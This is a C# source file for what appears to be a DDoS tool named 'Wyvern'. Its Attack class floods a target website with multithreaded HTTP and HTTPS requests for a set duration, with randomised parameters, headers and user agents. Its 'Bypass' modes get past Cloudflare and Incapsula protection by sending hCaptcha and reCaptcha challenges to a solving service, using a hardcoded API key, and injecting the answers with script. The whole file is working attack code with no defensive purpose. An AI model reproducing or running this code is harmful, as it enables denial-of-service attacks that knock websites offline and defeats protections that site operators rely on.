using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace Wyvern
{
    public class Attack
    {
        private byte[] BytesToSend;
        private IPAddress[] TargetIP;
        private WebBrowser AuthClient = new WebBrowser();
        private Uri TargetUri;
        private Random r = new Random();
        private string ParamContent;
        private string BodyContent;
        private int BodyContentLength;

        private string AttackType;
        private string Target;
        private int Thread;
        private int Connection;
        private int Duration;
        private int Interval;
        private string Method;
        private bool RandomHeader;
        private bool Fuzzer;
        private int Protection;
        private int CookieDuration;

        private bool Attacking;

        public Attack(string AttackType, string Target, int Thread, int Connection, int Duration, int Interval, string Method, bool RandomHeader, bool Fuzzer, int Protection, int CookieDuration)
        {
            this.AttackType = AttackType;
            this.Target = Target;
            this.Thread = Thread;
            this.Connection = Connection;
            this.Duration = Duration;
            this.Interval = Interval;
            this.Method = Method;
            this.RandomHeader = RandomHeader;
            this.Fuzzer = Fuzzer;
            this.Protection = Protection;
            this.CookieDuration = CookieDuration;

            if (this.Target.Contains("?") && this.Target.Contains("!"))
            {
                if (this.Target.IndexOf('?') < this.Target.IndexOf('!'))
                {
                    this.TargetUri = new Uri(this.Target.Split('?')[0]);
                }
                else
                {
                    this.TargetUri = new Uri(this.Target.Split('!')[0]);
                }
            }
            else if (this.Target.Contains("?"))
            {
                this.TargetUri = new Uri(this.Target.Split('?')[0]);
            }
            else if (this.Target.Contains("!"))
            {
                this.TargetUri = new Uri(this.Target.Split('!')[0]);
            }
            else
            {
                this.TargetUri = new Uri(this.Target);
            }

            this.AuthClient.ScriptErrorsSuppressed = true;
            this.AuthClient.ScrollBarsEnabled = false;
            TargetIP = Dns.GetHostAddresses(this.TargetUri.Host);
        }

        private void CheckTime()
        {
            var sw = new Stopwatch();
            var cookieSW = new Stopwatch();
            cookieSW.Reset();
            cookieSW.Start();
            sw.Reset();
            sw.Start();
            while (sw.Elapsed <= TimeSpan.FromSeconds(this.Duration))
            {
                if (this.AttackType.Equals("Bypass"))
                {
                    if (cookieSW.Elapsed >= TimeSpan.FromMinutes(this.CookieDuration))
                    {
                        switch (this.Protection)
                        {
                            case 0:
                                AuthClient.Navigate(this.TargetUri.Scheme + Uri.SchemeDelimiter + this.TargetUri.Host.ToString());
                                Sleep(5000);
                                ResultPacket();
                                break;
                            case 1:
                                CloudflareResolver();
                                ResultPacket();
                                break;
                            case 2:
                                IncapsulaResolver();
                                ResultPacket();
                                break;
                        }
                        cookieSW.Reset();
                    }
                }
            }
            cookieSW.Stop();
            sw.Stop();
            this.Attacking = false;
        }

        public void Start()
        {
            if (this.AttackType.Equals("Simple"))
            {
                ResultPacket(); 
                this.Attacking = true;
                for (int i = 0; i < this.Thread; i++)
                {
                    if (this.TargetUri.Scheme.Equals("https"))
                    {
                        new System.Threading.Thread(SendSSL).Start();
                    }
                    else
                    {
                        new System.Threading.Thread(Send).Start();
                    }
                    System.Threading.Thread.Sleep(10);
                }
                CheckTime();
            }
            else if (this.AttackType.Equals("Bypass"))
            {
                switch (this.Protection)
                {
                    case 0:
                        AuthClient.Navigate(this.TargetUri.Scheme + Uri.SchemeDelimiter + this.TargetUri.Host.ToString());
                        Sleep(5000);
                        ResultPacket();
                        this.Attacking = true;
                        for (int i = 0; i < this.Thread; i++)
                        {
                            if (this.TargetUri.Scheme.Equals("https"))
                            {
                                new System.Threading.Thread(SendSSL).Start();
                            }
                            else
                            {
                                new System.Threading.Thread(Send).Start();
                            }
                            System.Threading.Thread.Sleep(10);
                        }
                        CheckTime();
                        break;
                    case 1:
                        CloudflareResolver();
                        ResultPacket();
                        this.Attacking = true;
                        for (int i = 0; i < this.Thread; i++)
                        {
                            if (this.TargetUri.Scheme.Equals("https"))
                            {
                                new System.Threading.Thread(SendSSL).Start();
                            }
                            else
                            {
                                new System.Threading.Thread(Send).Start();
                            }
                            System.Threading.Thread.Sleep(10);
                        }
                        CheckTime();
                        break;
                    case 2:
                        IncapsulaResolver();
                        ResultPacket();
                        Console.WriteLine(Encoding.UTF8.GetString(this.BytesToSend));
                        this.Attacking = true;
                        for (int i = 0; i < this.Thread; i++)
                        {
                            if (this.TargetUri.Scheme.Equals("https"))
                            {
                                new System.Threading.Thread(SendSSL).Start();
                            }
                            else
                            {
                                new System.Threading.Thread(Send).Start();
                            }
                            System.Threading.Thread.Sleep(10);
                        }
                        CheckTime();
                        break;
                }
            }
        }

        private void Send()
        {
            checked
            {
                Socket[] clientArray = new Socket[this.Connection];
                while (this.Attacking)
                {
                    try
                    {
                        for (int i = 0; i < this.Connection; i++)
                        {
                            clientArray[i] = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        }
                        for (int i = 0; i < this.Connection; i++)
                        {
                            clientArray[i].Connect(this.TargetIP, 80);
                            clientArray[i].Send(this.BytesToSend);
                        }
                        for (int i = 0; i < this.Connection; i++)
                        {
                            clientArray[i].Close();
                        }
                    }
                    catch (Exception ex)
                    {
                    }
                    System.Threading.Thread.Sleep(this.Interval);
                }
            }
        }

        private void SendSSL()
        {
            checked
            {
                TcpClient[] clientArray = new TcpClient[this.Connection];
                SslStream[] streamArray = new SslStream[this.Connection];
                while (this.Attacking)
                {
                    try
                    {
                        for (int i = 0; i < this.Connection; i++)
                        {
                            clientArray[i] = new TcpClient();
                        }
                        for (int i = 0; i < this.Connection; i++)
                        {
                            clientArray[i].Connect(this.TargetIP, 443);
                            streamArray[i] = new SslStream(clientArray[i].GetStream());
                            streamArray[i].AuthenticateAsClient(this.TargetUri.Host, null, (SslProtocols)48 | (SslProtocols)192 | (SslProtocols)768 | (SslProtocols)3072, true);
                            streamArray[i].Write(this.BytesToSend);
                        }
                        for (int i = 0; i < this.Connection; i++)
                        {
                            streamArray[i].Close();
                            clientArray[i].Close();
                        }
                    }
                    catch (Exception ex)
                    {
                    }
                    System.Threading.Thread.Sleep(this.Interval);
                }
            }
        }

        private void ResultPacket()
        {
            if (this.Target.Contains("?") && this.Target.Contains("!"))
            {
                if (this.Target.IndexOf('?') < this.Target.IndexOf('!'))
                {
                    this.ParamContent = RandData(this.Target.Split('?')[1].Split('!')[0]);
                    this.BodyContent = RandData(this.Target.Split('!')[1]);
                    this.BodyContentLength = this.BodyContent.Length;
                }
                else
                {
                    this.BodyContent = RandData(this.Target.Split('!')[1].Split('?')[0]);
                    this.BodyContentLength = this.BodyContent.Length;
                    this.ParamContent = RandData(this.Target.Split('?')[1]);
                }
            }
            else if (this.Target.Contains("?"))
            {
                this.BodyContent = string.Empty;
                this.ParamContent = RandData(this.Target.Split('?')[1]);
            }
            else if (this.Target.Contains("!"))
            {
                this.ParamContent = string.Empty;
                this.BodyContent = RandData(this.Target.Split('!')[1]);
                this.BodyContentLength = this.BodyContent.Length;
            }
            else
            {
                this.ParamContent = string.Empty;
                this.BodyContent = string.Empty;
            }
            this.BytesToSend = Encoding.UTF8.GetBytes(GeneratePacket());
        }

        private string RandomString(int _nLength)
        {
            var strPool = "abcdefghijklmnopqrstuvwxyx0123456789";
            var chRandom = new char[_nLength];
            for (int i = 0; i < _nLength; i++)
            {
                chRandom[i] = strPool[this.r.Next(strPool.Length)];
            }
            var strRet = new String(chRandom);
            return strRet;
        }

        private string RandomIntStr(int _nLength)
        {
            var strPool = "0123456789";
            var chRandom = new char[_nLength];
            for (int i = 0; i < _nLength; i++)
            {
                chRandom[i] = strPool[this.r.Next(strPool.Length)];
            }
            var strRet = new String(chRandom);
            return strRet;
        }

        private string RandData(string input)
        {
            var output = string.Empty;
            if (input.Contains("&"))
            {
                var splitedInput = input.Split('&');
                foreach (var oneSplited in splitedInput)
                {
                    if (oneSplited.Contains("%RAND%") || oneSplited.Contains("%RANDINT%"))
                    {
                        if (oneSplited.Contains("="))
                        {
                            var name = oneSplited.Split('=')[0];
                            var value = oneSplited.Split('=')[1];
                            if (value.Contains("%RAND%"))
                            {
                                var length = Convert.ToInt32(value.Replace("%RAND%", string.Empty));
                                output += name + "=" + RandomString(length) + "&";
                            }
                            if (value.Contains("%RANDINT%"))
                            {
                                var length = Convert.ToInt32(value.Replace("%RANDINT%", string.Empty));
                                output += name + "=" + RandomIntStr(length) + "&";
                            }
                        }
                    }
                    else
                    {
                        output += oneSplited + "&";
                    }
                }
            }
            else
            {
                if (input.Contains("%RAND%") || input.Contains("%RANDINT%"))
                {
                    if (input.Contains("="))
                    {
                        var name = input.Split('=')[0];
                        var value = input.Split('=')[1];
                        if (value.Contains("%RAND%"))
                        {
                            var length = Convert.ToInt32(value.Replace("%RAND%", string.Empty));
                            output += name + "=" + RandomString(length);
                        }
                        else if (value.Contains("%RANDINT%"))
                        {
                            var length = Convert.ToInt32(value.Replace("%RANDINT%", string.Empty));
                            output += name + "=" + RandomIntStr(length);
                        }
                    }
                }
                else
                {
                    output += input;
                }
            }
            return output.Trim('&');
        }

        [DllImport("wininet.dll", SetLastError = true)]
        private static extern bool InternetGetCookieEx(string url, string cookieName, StringBuilder cookieData, ref int size, Int32 dwFlags, IntPtr lpReserved);
        private const Int32 InternetCookieHttponly = 0x2000;
        private static string GetCookie(Uri uri)
        {
            int datasize = 8192 * 16;
            StringBuilder cookieData = new StringBuilder(datasize);
            if (!InternetGetCookieEx(uri.ToString(), null, cookieData, ref datasize, InternetCookieHttponly, IntPtr.Zero))
            {
                if (datasize < 0)
                    return string.Empty;
                cookieData = new StringBuilder(datasize);
                if (!InternetGetCookieEx(
                    uri.ToString(),
                    null, cookieData,
                    ref datasize,
                    InternetCookieHttponly,
                    IntPtr.Zero))
                    return string.Empty;
            }
            return cookieData.ToString();
        }

        private string GeneratePacket()
        {
            string packet = string.Empty;
            string cookieString;
            string targetAddress = string.Empty;
            cookieString = GetCookie(this.TargetUri);
            if (this.AttackType.Equals("Simple"))
            {
                if (!this.ParamContent.Equals(string.Empty))
                {
                    if (this.Target.Contains("?") && this.Target.Contains("!"))
                    {
                        if (this.Target.IndexOf('?') < this.Target.IndexOf('!'))
                        {
                            targetAddress = this.Target.Split('?')[0] + "?" + this.ParamContent;
                        }
                        else
                        {
                            targetAddress = this.Target.Split('!')[0] + "?" + this.ParamContent;
                        }
                    }
                    else if (this.Target.Contains("?"))
                    {
                        targetAddress = this.Target.Split('?')[0] + "?" + this.ParamContent;
                    }
                }
                else
                {
                    if (this.Target.Contains("!"))
                    {
                        targetAddress = this.Target.Split('!')[0];
                    }
                    else
                    {
                        targetAddress = this.Target;
                    }
                }
                packet += this.Method + " " + targetAddress + " HTTP/1.1\r\nHost: " + this.TargetUri.Host + "\r\n";
                if (this.RandomHeader)
                {
                    packet += Variable.Accepts[this.r.Next(Variable.Accepts.Length)];
                    if (!this.BodyContent.Equals(string.Empty))
                    {
                        packet += "Content-Type: application/x-www-form-urlencoded\r\n";
                        packet += "Content-Length: " + this.BodyContentLength.ToString() + "\r\n";
                    }
                    packet += "Upgrade-Insecure-Requests: 1\r\n";
                    packet += "User-Agent: " + Variable.UserAgents[this.r.Next(Variable.UserAgents.Length)] + "\r\n";
                    packet += "\r\n";
                    if (!this.BodyContent.Equals(string.Empty))
                    {
                        packet += this.BodyContent;
                    }
                }
                else
                {
                    packet += "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, image/webp, image/apng, */*;q=0.8, application/signed-exchange;v=b3;q=0.9\r\n";
                    if (!this.BodyContent.Equals(string.Empty))
                    {
                        packet += "Content-Type: application/x-www-form-urlencoded\r\n";
                        packet += "Content-Length: " + this.BodyContentLength.ToString() + "\r\n";
                    }
                    packet += "Accept-Encoding: gzip, deflate\r\n";
                    packet += "Accept-Language: en-US, en;q=0.9, ko-KR;q=0.8, ko;q=0.7, de;q=0.6, ar;q=0.5, pt;q=0.4, ja;q=0.3, fr;q=0.2\r\n";
                    packet += "Upgrade-Insecure-Requests: 1\r\n";
                    packet += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36\r\n";
                    packet += "\r\n";
                    if (!this.BodyContent.Equals(string.Empty))
                    {
                        packet += this.BodyContent;
                    }
                }
            }
            else if (this.AttackType.Equals("Bypass"))
            {
                if (!this.ParamContent.Equals(string.Empty))
                {
                    if (this.Target.Contains("?") && this.Target.Contains("!"))
                    {
                        if (this.Target.IndexOf('?') < this.Target.IndexOf('!'))
                        {
                            targetAddress = this.Target.Split('?')[0] + "?" + this.ParamContent;
                        }
                        else
                        {
                            targetAddress = this.Target.Split('!')[0] + "?" + this.ParamContent;
                        }
                    }
                    else if (this.Target.Contains("?"))
                    {
                        targetAddress = this.Target.Split('?')[0] + "?" + this.ParamContent;
                    }
                }
                else
                {
                    if (this.Target.Contains("!"))
                    {
                        targetAddress = this.Target.Split('!')[0];
                    }
                    else
                    {
                        targetAddress = this.Target;
                    }
                }
                packet += this.Method + " " + targetAddress + " HTTP/1.1\r\nHost: " + this.TargetUri.Host + "\r\n";
                if (this.RandomHeader)
                {
                    packet += Variable.Accepts[this.r.Next(Variable.Accepts.Length)];
                    if (!this.BodyContent.Equals(string.Empty))
                    {
                        packet += "Content-Type: application/x-www-form-urlencoded\r\n";
                        packet += "Content-Length: " + this.BodyContentLength.ToString() + "\r\n";
                    }
                    if (!cookieString.Equals(string.Empty))
                    {
                        packet += "Cookie: " + cookieString + "\r\n";
                    }
                    packet += "Upgrade-Insecure-Requests: 1\r\n";
                    packet += "User-Agent: " + Variable.BypassUserAgent + "\r\n";
                    packet += "\r\n";
                    if (!this.BodyContent.Equals(string.Empty))
                    {
                        packet += this.BodyContent;
                    }
                }
                else
                {
                    packet += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n";
                    if (!this.BodyContent.Equals(string.Empty))
                    {
                        packet += "Content-Type: application/x-www-form-urlencoded\r\n";
                        packet += "Content-Length: " + this.BodyContentLength.ToString() + "\r\n";
                    }
                    if (!cookieString.Equals(string.Empty))
                    {
                        packet += "Cookie: " + cookieString + "\r\n";
                    }
                    packet += "Accept-Encoding: gzip, deflate\r\n";
                    packet += "Accept-Language: en-US,en;q=0.9,ko-KR;q=0.8,ko;q=0.7,de;q=0.6,ar;q=0.5,pt;q=0.4,ja;q=0.3,fr;q=0.2\r\n";
                    packet += "Upgrade-Insecure-Requests: 1\r\n";
                    packet += "User-Agent: " + Variable.BypassUserAgent + "\r\n";
                    packet += "\r\n";
                    if (!this.BodyContent.Equals(string.Empty))
                    {
                        packet += this.BodyContent;
                    }
                }
            }
            return packet;
        }

        private void Sleep(int ms)
        {
            Stopwatch sw = new Stopwatch();
            sw.Start();
            while (sw.ElapsedMilliseconds <= ms)
            {
                Application.DoEvents();
            }
            sw.Stop();
        }

        private void CloudflareResolver()
        {
            string sitekey = string.Empty;
            var captchaResolver = new Captcha();
        retryCap:
            try
            {
                AuthClient.Navigate(this.TargetUri.Scheme + Uri.SchemeDelimiter + this.TargetUri.Host.ToString()); 
                while (AuthClient.DocumentText.Contains("Just a moment..."))
                {
                    System.Threading.Thread.Sleep(500);
                }
                Sleep(5000);
                if (!AuthClient.DocumentText.Contains("Attention Required"))
                {
                    return;
                }
                Regex reg = new Regex("data-sitekey=\"(.[^\"]+)\"");
                MatchCollection result = reg.Matches(AuthClient.DocumentText);
                foreach (Match mm in result)
                {
                    sitekey = mm.Groups[1].ToString();
                }
            NoSlot:
                string capId = captchaResolver.hCaptcha("fb3e80d6b9a3e59587e4503769519865", sitekey, AuthClient.Url.ToString());
                if (capId.Equals("ERROR_KEY_DOES_NOT_EXIST") || capId.Equals("ERROR_ZERO_BALANCE"))
                {
                    return;
                }
                else if (capId.Equals("ERROR_NO_SLOT_AVAILABLE"))
                {
                    System.Threading.Thread.Sleep(10000);
                    goto NoSlot;
                }
                else if (capId.Contains("ERROR"))
                {
                    goto retryCap;
                }
                System.Threading.Thread.Sleep(15000);
                while (AuthClient.DocumentText.Contains("Just a moment..."))
                {
                    System.Threading.Thread.Sleep(1000);
                }
                string answer = captchaResolver.resCaptcha("fb3e80d6b9a3e59587e4503769519865", capId);
                if (answer.Equals("ERROR_CAPTCHA_UNSOLVABLE"))
                {
                    goto retryCap;
                }
                AuthClient.Document.InvokeScript("eval", new object[] { "document.getElementsByName(\"g-recaptcha-response\")[0].value = \"" + answer + "\"" });
                AuthClient.Document.InvokeScript("eval", new object[] { "document.getElementsByName(\"h-captcha-response\")[0].value = \"" + answer + "\"" });
                AuthClient.Document.InvokeScript("eval", new object[] { "document.getElementById(\"challenge-form\").submit();" });
                Sleep(5000);
                if (AuthClient.DocumentText.Contains("Attention Required"))
                {
                    goto retryCap;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
                goto retryCap;
            }
        }

        private void IncapsulaResolver()
        {
            string sitekey = string.Empty;
            string url = string.Empty;
            var captchaResolver = new Captcha();
        retryCap:
            try
            {
                for (int i = 0; i < 5; i++)
                {
                    AuthClient.Navigate(this.TargetUri.Scheme + Uri.SchemeDelimiter + this.TargetUri.Host.ToString());
                    Sleep(300);
                }
                AuthClient.Navigate(this.TargetUri.Scheme + Uri.SchemeDelimiter + this.TargetUri.Host.ToString());
                Sleep(5000);
                if (!AuthClient.DocumentText.Contains("Request unsuccessful"))
                {
                    return;
                }
                mshtml.HTMLDocument doc = (mshtml.HTMLDocument)AuthClient.Document.DomDocument;
                object index = 0;
                mshtml.IHTMLWindow2 frame2 = (mshtml.IHTMLWindow2)doc.frames.item(ref index);
                doc = (mshtml.HTMLDocument)frame2.document;
                Regex reg = new Regex("data-sitekey=\"(.[^\"]+)\"");
                MatchCollection result = reg.Matches(doc.documentElement.innerHTML);
                foreach (Match mm in result)
                {
                    sitekey = mm.Groups[1].ToString();
                }
                Regex reg2 = new Regex("\"POST\", \"(.+)\",");
                MatchCollection result2 = reg2.Matches(doc.documentElement.innerHTML);
                foreach (Match mm in result2)
                {
                    url = mm.Groups[1].ToString();
                }
            NoSlot:
                string capId = captchaResolver.reCaptcha(Config.captchaKey, sitekey, AuthClient.Url.ToString());
                if (capId.Equals("ERROR_KEY_DOES_NOT_EXIST") || capId.Equals("ERROR_ZERO_BALANCE"))
                {
                    return;
                }
                else if (capId.Equals("ERROR_NO_SLOT_AVAILABLE"))
                {
                    System.Threading.Thread.Sleep(10000);
                    goto NoSlot;
                }
                else if (capId.Contains("ERROR"))
                {
                    goto retryCap;
                }
                System.Threading.Thread.Sleep(15000);
                string answer = captchaResolver.resCaptcha(Config.captchaKey, capId);
                if (answer.Equals("ERROR_CAPTCHA_UNSOLVABLE"))
                {
                    goto retryCap;
                }
                AuthClient.Document.InvokeScript("eval", new object[] { "var xhr;" });
                AuthClient.Document.InvokeScript("eval", new object[] { "xhr = (window.XMLHttpRequest) ? new XMLHttpRequest : new ActiveXObject(\"Microsoft.XMLHTTP\");" });
                AuthClient.Document.InvokeScript("eval", new object[] { "var msg = \"g-recaptcha-response=" + answer + "\";" });
                AuthClient.Document.InvokeScript("eval", new object[] { "xhr.open(\"POST\", \"" + url + "\", true);" });
                AuthClient.Document.InvokeScript("eval", new object[] { "xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");" });
                AuthClient.Document.InvokeScript("eval", new object[] { "xhr.onreadystatechange = function(){ if (xhr.readyState == 4) { window.parent.location.reload(true); }};" });
                AuthClient.Document.InvokeScript("eval", new object[] { "xhr.send(msg);" });
                Sleep(5000);
                if (AuthClient.DocumentText.Contains("Request unsuccessful"))
                {
                    goto retryCap;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
                goto retryCap;
            }
        }

        public void Dispose()
        {
            GC.SuppressFinalize(this);
        }
    }
}
